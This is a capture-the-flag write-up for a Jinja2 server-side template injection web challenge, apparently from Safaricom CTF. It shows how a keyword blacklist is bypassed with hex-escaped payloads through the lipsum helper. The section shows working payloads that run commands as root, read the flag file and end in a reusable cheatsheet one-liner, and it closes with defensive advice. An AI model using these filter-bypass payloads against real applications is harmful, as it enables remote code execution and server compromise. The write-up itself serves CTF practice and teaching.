# Safaricom CTF — Ginger Juice Shop (Web, 350 pts)

> **Assumption:** the CHALLENGE CONTEXT block in the brief was blank, so I assumed
> the event is **Safaricom CTF (SAFCTF)**, category **Web**, difficulty **350 pts**,
> and the target is `http://54.72.82.22:8050`. All commands and outputs below were
> captured live against that service.

## 1. Challenge Overview

"Ginger Juice Shop" is a **350 pt web** challenge (themed "CITRUS STUDIO"). It has a
single text box that greets you by name. The greeting is rendered as a **Jinja2
template**, so the box is vulnerable to Server-Side Template Injection — but a
blacklist "WAF" blocks the obvious keywords. The goal is to bypass the filter, run a
command, and read the flag.

## 2. What You Need Before Starting

- **curl** — `sudo apt install curl` (Kali already has it).
- A browser with DevTools, optional.
- **Time estimate:** 45–90 minutes. This one is harder than the plain SSTI challenge
  because the filter rejects the usual payloads, so expect to experiment.

## 3. Reconnaissance

1. Fetch the home page and find the input:

```bash
curl -s http://54.72.82.22:8050/
```

Representative output (trimmed):

```html
<title>CITRUS STUDIO</title>
...
<form method="post">
  <input type="text" name="name" placeholder="Enter your name">
  <button>Submit</button>
</form>
```

**Why this matters:** one field, `name`, posted to `/`. That is our only input.

2. Send a normal value to see how it is used:

```bash
curl -s -m 10 -X POST --data "name=test" http://54.72.82.22:8050/
```

Representative output (trimmed):

```html
<h2>Hello, test! Did you find the suspects yet?</h2>
```

**Why this matters:** our input is echoed into a greeting. The wording "Did you find the
suspects yet?" and the filter message are hints the author deliberately added a
blacklist.

3. Test template injection:

```bash
curl -s -m 10 -X POST --data "name={{7*7}}" http://54.72.82.22:8050/
```

Expected output (trimmed):

```html
<h2>Hello, 49! Did you find the suspects yet?</h2>
```

**Why this matters:** `{{7*7}}` became `49`, so this is **SSTI** in Jinja2 — same as
"Second Look". But watch what happens when you try the *obvious* escalation:

```bash
curl -s -m 10 --data-urlencode 'name={{config}}' http://54.72.82.22:8050/
```

Expected output:

```html
<h2>Invalid input detected! You might need to Try Hard!!</h2>
```

**Why this matters:** a filter is watching for dangerous keywords. We must reach the
same goal without using those literal words.

[SCREENSHOT: the CITRUS STUDIO page greeting you, then the "Invalid input detected" block]

## 4. Identifying the Vulnerability

Two things are combined here:

1. **Server-Side Template Injection (SSTI)** — the `name` value is compiled as a Jinja2
   template, so `{{ ... }}` is executed as Python-flavoured template code.
2. **A blacklist WAF** (`Invalid input detected`) that tries to stop the usual attack
   words: things like `config`, `__class__`, `__mro__`, `__subclasses__`, `__globals__`,
   `__builtins__`, `os`, and `system`.

Blacklists are famously weak. They compare the *literal text* of my request against a
list of forbidden substrings. If I never send the forbidden text but the template still
**produces** it, the filter is bypassed.

The sign that tipped me off: `{{lipsum}}` came back as a function object, meaning Jinja2
gives us helper objects. Blocked were `{{config}}`, `{{''.__class__}}`,
`{{().__class__}}`, `{{os}}`, `{{__globals__}}`, `{{__builtins__}}`, `{{[].__class__}}` —
but a plain `{{7*7}}` was fine. So the filter is substring-based on keywords, not on the
`{{ }}` syntax itself.

**Analogy:** a bouncer with a list of banned words on a clipboard. Say "the object's
double-underscore-globals-double-underscore" in a way the clipboard does not contain,
and you walk right past.

## 5. Exploitation Step by Step

1. **Confirm what is blocked and what is not.** A quick probe loop (echo only, no
   changes) shows the pattern:

```bash
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$1"; }
probe(){ r=$(curl -s -m 12 --data "name=$(enc "$1")" http://54.72.82.22:8050/);
  if echo "$r" | grep -q "Invalid input detected"; then echo "BLOCKED  <$1>";
  else echo "ok       <$1>"; fi; }
for p in "{{config}}" "{{lipsum}}" "{{cycler}}" "{{''.__class__}}" "{{__globals__}}" "{{os}}" "{{7*7}}"; do probe "$p"; done
```

Representative output:

```text
BLOCKED  <{{config}}>
ok       <{{lipsum}}>
ok       <{{cycler}}>
BLOCKED  <{{''.__class__}}>
BLOCKED  <{{__globals__}}>
BLOCKED  <{{os}}>
ok       <{{7*7}}>
```

**Why this matters:** the filter blocks the literal strings `config`, `__class__`,
`__globals__`, and `os`. It does **not** block `lipsum` or `cycler`.

2. **Bypass the filter with Jinja string escapes.** In Jinja/Python, `"\x5f"` is the
   underscore `_` and `"\x6f\x73"` is the string `os`. The request never contains the
   blocked words, but the template evaluates to the same thing:

```bash
curl -s -m 12 --data-urlencode 'name={{"\x6f\x73"}}' http://54.72.82.22:8050/
```

Expected output (trimmed):

```html
<h2>Hello, os! Did you find the suspects yet?</h2>
```

**What to look for:** the string `os` appeared in the output even though we never typed
it. The filter only sees `\x6f\x73`, so it lets the request through. This is the key
insight.

3. **Reach the `os` module through Jinja's `lipsum` helper.** Subscript access
   (`obj["attr"]`) works where `obj.attr` is filtered:

```bash
curl -s -m 12 --data-urlencode 'name={{lipsum["\x5f\x5fglobals\x5f\x5f"]["\x6f\x73"]}}' \
  http://54.72.82.22:8050/
```

Expected output (trimmed):

```html
<h2>Hello, &lt;module 'os' (frozen)&gt;! Did you find the suspects yet?</h2>
```

**What to look for:** the `<module 'os'>` object. We now have a Python object that can run
commands — without ever sending the banned words.

4. **Run a command to confirm code execution.**

```bash
curl -s -m 12 --data-urlencode 'name={{lipsum["\x5f\x5fglobals\x5f\x5f"]["\x6f\x73"].popen("id").read()}}' \
  http://54.72.82.22:8050/
```

Expected output (trimmed):

```html
<h2>Hello, uid=0(root) gid=0(root) groups=0(root)! Did you find the suspects yet?</h2>
```

**What to look for:** `uid=0(root)` — remote code execution as root.

5. **Find the flag file, then read it.** First locate candidates:

```bash
curl -s -m 12 --data-urlencode 'name={{lipsum["\x5f\x5fglobals\x5f\x5f"]["\x6f\x73"].popen("ls -la /app").read()}}' \
  http://54.72.82.22:8050/
```

Representative output (trimmed):

```text
total 556
-rw-r--r-- 1 root root  22417 ... app.py
drwxrwxr-x 1 root root   4096 ... templates
...
```

Then read the flag in the templates directory:

```bash
curl -s -m 12 --data-urlencode 'name={{lipsum["\x5f\x5fglobals\x5f\x5f"]["\x6f\x73"].popen("cat /app/templates/flag.txt").read()}}' \
  http://54.72.82.22:8050/
```

Expected output (trimmed):

```html
<h2>Hello, safctf{42dd8c3f359acdfc9b4250f4864ffc35}! Did you find the suspects yet?</h2>
```

**What to look for:** the `safctf{...}` value — that is the flag.

[SCREENSHOT: the greeting containing the flag, with the escaped payload visible in the request]

### Optional Burp Suite walkthrough

1. Intercept the form submit in **Proxy** and **Send to Repeater**.
2. In the body, set
   `name=%7B%7Blipsum%5B%22%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%22%5D%5B%22%5Cx6f%5Cx73%22%5D.popen(%22id%22).read()%7D%7D`.
   Use **Ctrl+U** in Burp to URL-encode the value so the `"` and `[]` survive.
3. Click **Send**, confirm `uid=0(root)`, then swap `id` for `cat /app/templates/flag.txt`.

## 6. Capturing the Flag

The flag is printed by `cat /app/templates/flag.txt` inside the greeting:

```
safctf{42dd8c3f359acdfc9b4250f4864ffc35}
```

## 7. Why This Works (Beginner Explanation)

The site's protection is a **blacklist**: it scans the text of my request for words like
`os`, `__globals__`, and `config`, and rejects it if it finds them. But the request is not
what runs — the **template** is what runs. Jinja's escape sequences (`\x5f` for `_`,
`\x6f\x73` for `os`) let me write a request that contains none of the banned text while
producing exactly the objects I need after evaluation.

Filter bypasses like this are a great reminder that blocking "bad words" as strings almost
never holds. Attackers have an effectively infinite set of encodings — hex, unicode,
concatenation, case changes — while the defender has to guess them all.

In the real world, SSTI in a production app can mean full server compromise. Here, the
code ran as root, and the flag was one `cat` away. The real fix is not a longer
blacklist; it is never rendering user input as a template at all.

## 8. Common Mistakes and Dead Ends

- **Trying `{{config}}` or `{{''.__class__.__mro__}}` first.** Those return
  "Invalid input detected" and waste time. Read the filter: line up which words are
  blocked before you craft a payload.
- **Using `|attr('__globals__')`.** `attr` itself showed up empty in testing and the
  inner words are still filtered. Subscript access with escaped names
  (`lipsum["\x5f\x5fglobals\x5f\x5f"]`) is the reliable route.
- **Forgetting to URL-encode.** Without `--data-urlencode`, curl may mangle `"`, `[`,
  `]` and `\`, and the template receives the wrong text.
- **Guessing the flag path.** `cat /flag` failed; the file was at
  `/app/templates/flag.txt`. Always `ls` first, then `cat` the file you found.

## 9. How to Defend Against This

- **Never render user input as a template.** Pass it as controlled data
  (`render_template("page.html", name=user_input)`) and let Jinja2 auto-escape it.
- Do not rely on **blacklists of keywords**; they are trivially bypassed with encodings.
- If dynamic templates are unavoidable, use a **sandboxed environment**
  (`jinja2.sandbox.SandboxedEnvironment`) and restrict accessible attributes.
- Run the app as a **non-root** user in a container with a read-only filesystem and no
  unnecessary binaries, so RCE has minimal impact.
- Keep secrets (including the flag) **outside the application directory** and off the
  filesystem the web app can read.

## 10. Key Takeaways

- `{{7*7}}` → `49` means SSTI; a "Try Hard" message means a filter.
- Jinja/Python escapes (`\x5f` = `_`, `\x6f\x73` = `os`) defeat keyword blacklists.
- Subscript access (`obj["attr"]`) can replace filtered attribute access (`obj.attr`).
- Cheatsheet:
  `curl -s --data-urlencode 'name={{lipsum["\x5f\x5fglobals\x5f\x5f"]["\x6f\x73"].popen("<cmd>").read()}}' http://TARGET/`
- **Flag:** `safctf{42dd8c3f359acdfc9b4250f4864ffc35}`

Blacklists rarely survive a curious beginner with an escape table in hand — nice work.
